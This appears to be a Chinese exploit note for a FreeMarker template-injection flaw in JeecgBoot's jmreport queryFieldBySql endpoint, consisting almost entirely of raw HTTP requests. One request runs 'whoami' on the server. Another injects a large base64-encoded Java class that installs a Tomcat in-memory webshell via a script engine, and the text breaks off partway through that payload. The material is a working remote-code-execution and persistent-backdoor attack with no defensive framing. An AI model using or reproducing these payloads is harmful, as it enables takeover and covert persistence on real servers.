queryFieldBySql SSTI模板注入POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1Host: 192.168.111.22:18088Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brCookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1758269454,1758270382Connection: keep-aliveContent-Type: application/jsonContent-Length: 99sql:select #assign ex=\\freemarker.template.utility.Execute\\?new() $ ex(\\whoami \\) 内存马GitHub - pen4uinjava-memshell-generator: 一款支持自定义的 Java 内存马生成工具｜A customizable Java in-memory webshell generation tool. POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1Host: 192.168.111.22:18088Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brCookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1758269454,1758270382Connection: keep-aliveContent-Type: application/jsonContent-Length: 16172sql:call$\\freemarker.template.utility.ObjectConstructor\\?new()(\\javax.script.ScriptEngineManager\\).getEngineByName(\\js\\).eval(\\classLoader=java.lang.Thread.currentThread().getContextClassLoader();tryclassLoader.loadClass(org.apachen.SOAPUtils).newInstance();catch(e)clsString=classLoader.loadClass(java.lang.String);bytecodeBase64=yv66vgAAADEBewEAIGNoL3Fvcy9sb2diYWNrL3UvRW5jcnlwdGlvblV0aWxzBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADGdldENsYXNzTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAKGNoLnFvcy5sb2diYWNrLldoaXRlQmxhY2tMaXN0WHdlTGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BCpRINHNJQUFBQUFBQUFBSTFYK1hjVDF4WCtualh5eUxJSVFjUUdRVXZaUWlSWnNnSUJZdVJBc0kwZE81RUV3U3d4VHBleE5MWUVzbVJtUm1aSjI2UnQwalVwVFhlNnBrdnFMbWtMS2NnUUNpRnRDcWM1UGFmTkQvMG4rZy8wOUljMi9kNk1iRWxlT1FmbWpkNjc5M3YzZmZlNzk0M2YrOTlidHdCc3gxMkJZRG9iTzEwMFkvbmkySWlXUGhVN25zMVplbmVlcjRtY2FUMXpScGVEWHRBTkZVTGcvcFBhcEJiTGE0V3gyTUdSazNyYVV1RVMyQ3BuejhaTTNaak02MVpzMEJrUDY2ZEx1bWxWL2QwQ2pZL2xDamxybjRBckdEb21vUFFVTTdyQXlrU3VvS2RLNHlPNmNVUWJ5WFBHbnlpbXRmd3h6Y2pKMzVWSnhjcm1USUZ3NGw1RDd2UkJoY2NMQmZjeGRNT0o1d0QvRzhWemVrWmdXekN4Vk9TOWszckI2cFJ4cmpibkx3aHN1UWR2SHFXeTd3QVBudFB5dWZOeTU5VlZIbnZQcHZVSksxY3NxR2poR1RPYXBRazBESGNMTktmem1ta21pbHBHTndRQzltNnhBamM2ZWpqUlUxM2lIbzNqdXBVdEVuZGRvZ3BzNktONVppaVd0TmRvNVNiZStmTUNxMnFNYkJ5dXVkSjVVOUplWFJtMGpGeGhqRXNlUXpjbmlnV1RHWmpMVjlheUptTDlmTXdlM2JHa2wxbzV0c0JEeXpyWmh2VFp0Q3lmS2g0VWVQQ2U4RlE4eEF6Zlc3d3FRblhhZHM2dW9rMWd4YUJGWVNXMWlZb0lWNDNwVnYxR0FodURvU1dsUUIyMkkrYkZOandzMERwVzNiZlBLSTdQb2p5OVBMc08ydHpORnMyQ0R6dndpQmNOMkNuZ3plcFNMQ2x0WFBkaE56WTJjZnBSZ1NaRzA2ODdDcXVVUTEzNlEvT25mTmlEZURPQ1lNYWFIZFJqV3I1RTJMME9MTXZia3k0V0xDMVhvS2JXMTZMMlpEVmpVQjZqa05ZN1F5ZDgySTh1THlLZzJwVUpLdEdIQXc1R3I0Q1BvUjNTREFaczZZWVBUemliOW5OaFJEUDEzVHNQNkdtN2U3UXVGUFp3dHc5UDRpbDUrSVRBbWtWS1IwV0tjTFdMS2c3VktlRkkxdUFKVlJ5bUV0SWx3NkFHblNtQkI0SzE1RGl6Sk9jSWpub3hDSGFORmg2Z2h6em9aNjJldWtxdWM2eXRaQitld1pEMFBpRVFDZzdYVlh6bklqNmhZN0xMUGV2RlFYeVVleTVvcE9ManpGVkdIMldmdGFjOVlKTlpPY2RXUlZyRldrcThPai9BNk1lay95Z1RkR1RvVUs4UFdXeG93aGh5VGlrd0NYbk4wRFBKU2dQYXYwQXlodWYxbTlEaWJjcUhVOGg3a2NHNHdOckZyRlFVbVE5VHQ3clNhZDAwYzg3MUVEd2h1VGdOdzRzSm1ISml3Q0duNUdYQWsyeVR1Y0prOFJSTjk5Ukc2VnhrZFZGV3BrTHpwM3c0aTNNU24zMjB1YUNmR1NpWWxrWXh6NVhEclBrbjhTbDVtazl6ZCtwZWsxMjJaWUhkWlMyOGdNL0l1K3F6UkI3Tmw4eHNkMmwwVkNyL1JYaWFFY1pMTE9MWnk0SVozTUtPemd6MFVXa2RDeUF1WGN1ejhYMEpYNVpGOGhVUE5nbHNxQnFraW9PbGRMWXZwK2N6TlRmVVY4bnFwR2JzWXM5TExHM2I2VmcrWEgrcFZMWjExclk3dzQ3WnU2MHUwelpjeGZLUm1SS2ViNkhpdTJ3M3N0S2tzbml6emk4dW52SjcrTDZrOWdlczdSclIyZ0FDMFdYNlhuMUVQdndJUDVZcGZZMFNsSmRCYVVJMzdKdmFoNS9LYlRMNDJad2N6MkRhWW56ZGl3djRoUmNYcFVSZEJKalRlSmZTM3Evd2ErbjRHMTZ2R2J2N3NadTAxQmpXc3UvaVp3NmJvMWtxdEkvbnpIUjdkOWRnNzB6VE5EeTRSSXpSb24wZjhFWmRob0VaR3QvRUgrVDVyckJwT3ZzN0V2V2c3TndrVG5YNmNNMHA0ZXVWVnRwZXNuTDU5bTY3YTN0d2d6cDJrdUJFY3BPbDRhQjU4TGI4eXVNZDU4RTd0RHJLR3k3YU5jYWU2OEdmYWRXZHpZMXJaeno0Q3paUnNnbzRCUmVmdkRQNE9Tdmt0V2FQZSsyeGtXLzgvT096aWIrNjZDRTRyZ2xQWTJYWS82ZXI2QXY3MzcyS2pyRC96bFU4ZnBsTERmQlczQUFmbXUybjdjSnhoUTE4UDFaVjRIYlo5cHliNitpM0hWdWR4WXFqZlBOak5aOXNFek1RNGwzR0pxSGVieXRqKzIwRWsrSElOSGFsSXVFcjZMaU94eHB3QjFlcVAvanllQms5Ri9HYW5PdTdqb0VHeEpXQWNnY1h3Z0dsakdUY2ZRTUhoMXczOGZRMUhDOWplQm9maXpmNlArRWZhYnlKekpETHJ3OE9LVy9pNU9DUVd6N0xLTVRWZ0VwSEs2QUdHbW1qRExrQ2J0cmN3TmlRYXhwbmFDaGZBKzViOGtjWno5MUdKdTRKZU1wNDNtMWJSMmdjNWNMbmprZXY0L01DVTNESDNWTlFVcGQ1K1AyNGkvZElnd2Qvdzk4NXVteUsrbmg0b0lXemEzQWYxaUtHQURxeGp0WWZRajgrakdGc3dEbDhCTTh6Z1c4d3llOWdNM0cyRW1rTGNVSkVDdUlmYklXUzRtZEpYajh0MXhESFRjODhzZFl4Q2VlUXducmlxVVJZVDh3TjNLMFRyeEoxby94REFMZUl1NW54a1BqWjlMeGZTWThIZitWT1d4bC9sTE5ib0h6QXJkMHFHbFJzVXhGVUVWYjVzU0pVdFA0SG9wdUR6RDIvc2ZqOEFoMmtJbHZ0blBaenhzMHhJcEp0L2k5ZXc4ditWL2k0alhCeUNvRlVXODB2VDF5Wmdvdi9JcGZvMDBDQ0hpQkdDOFBkTE9GNVdIWm96a3ZVZnpKc2lkb2hrdUV5ZnBpSytwWFgwUnFsZm41Q3BCVnhKVnJHejFOVEgvd3JjaGUrRzdndzFEYU5xYmNqVFBJdkkzUjQ0eExqVzhHRHRySURPUW5aUVFya0g0THlGQ3AyY25VMzF4K2xSUWRwM1VQNjRxUnRMeW5aUjByMjA2ckxKbjhuNDVDMGY0M0VLaklpZkIzZnNLbnN3RGZwd2I5Z2lQUXRmSnVqU3Z6dk1BMHVtOVJWVVA0TFZjVkZGWm1VaWd0TnZocnFoUHhtcXh6MjM4eWxQS3pwdjN3TlY1TVIvN1RpQ0RsQ3piMFZvUXdWVzRadGpqWjE1OStscFArUE5DYzF0MWdLR1ZvS2ptVGdPVmtzSk0xL3V4WW1vQ3dJWWxkeWxCL3RNOEtWd2dJL1FSdVoyWFlNVUxoUHNnVTh4YmVFemNjK3JqUlNuRkp1RFZ6Wlo3KzV1QjdHYjhtTVFvOERaT3QzZGw4d1o0Vm40dmMyVzFHbmZ4U2twS3AwNFAvcnNZUXdxUThBQUE9PQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAIkxjaC9xb3MvbG9nYmFjay91L0VuY3J5cHRpb25VdGlsczsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBNAQAQamF2YS9sYW5nL1RocmVhZAcATwEAEWphdmEvdXRpbC9IYXNoTWFwBwBRAQATamF2YS91dGlsL0FycmF5TGlzdAcAUwoAVAApAQAKZ2V0VGhyZWFkcwgAVgEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABYAFkKAAIAWgEAB2dldE5hbWUMAFwABgoAUABdAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAXwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABhAGIKAA8AYwEABnRhcmdldAgAZQEABWdldEZWDABnAFkKAAIAaAEABnRoaXMkMAgAaggARAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABtAG4KAFIAbwEADWphdmEvdXRpbC9TZXQHAHELAHIAMQEAA2dldAwAdAA8CgBSAHUBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHcAeAoABAB5AQAPamF2YS9sYW5nL0NsYXNzBwB7CgB8AF0BAA9TdGFuZGFyZENvbnRleHQIAH4BAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIAAgQsAJQCCAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACEAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAhgCHCgBQAIgBAAh0b1N0cmluZwwAigAGCgB8AIsBABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACNAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAjwEACXJlc291cmNlcwgAkQgAHQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCUAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAASAJYKAJUAlwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCZAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAmwEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAJ0BAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKEBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAqwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwArQCuCgBQAK8BAA5nZXRDbGFzc0xvYWRlcgwAsQCHCgB8ALIMAAUABgoAAgC0AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAtgC3CgCsALgBAAtuZXdJbnN0YW5jZQwAugA4CgB8ALsMAAoABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKUHAKQBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqAkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAHwA0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMAOUA5goAAgDnAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyCADpAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABYAOsKAAIA7AEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAO4HAOEBABBqYXZhL3V0aWwvQXJyYXlzBwDxAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwA8wD0CgDyAPUBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAASAPcKAFQA+AoAVACCAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA+wEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAP0A/goAVAD/AQABaQEAAUkBAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEc2l6ZQEAAygpSQwBBQEGCgBUAQcBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAHQBCQoAVAEKAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAREBAAdmb3JOYW1lDAETALcKAHwBFAEADGRlY29kZUJ1ZmZlcggBFgEACWdldE1ldGhvZAwBGADPCgB8ARkBABBqYXZhLnV0aWwuQmFzZTY0CAEbAQAKZ2V0RGVjb2RlcggBHQEABmRlY29kZQgBHwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwEhAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEsAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBLgEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwEwCgEtACkBAAUoW0IpVgwAEgEzCgEvATQBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABIBNgoBMQE3AQAEcmVhZAEABShbQilJDAE5AToKATEBOwEABXdyaXRlAQAHKFtCSUkpVgwBPQE+CgEtAT8BAAt0b0J5dGVBcnJheQEABCgpW0IMAUEBQgoBLQFDAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBSQFKCgACAUsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBTQoBTgDWCgFOAHUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAVEBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAVQBVQoAfAFWAQANZ2V0U3VwZXJjbGFzcwwBWAB4CgB8AVkKAVIAFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRo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;tryclsBase64=classLoader.loadClass(java.util.Base64);clsDecoder=classLoader.loadClass(java.util.Base64$Decoder);decoder=clsBase64.getMeth